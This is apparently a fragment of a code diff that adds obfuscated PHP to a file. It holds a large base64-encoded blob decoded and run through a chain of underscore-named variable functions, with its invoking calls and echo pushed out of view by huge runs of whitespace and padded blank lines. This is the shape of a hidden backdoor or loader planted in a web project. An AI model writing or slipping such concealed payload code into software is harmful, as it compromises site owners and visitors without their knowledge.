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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
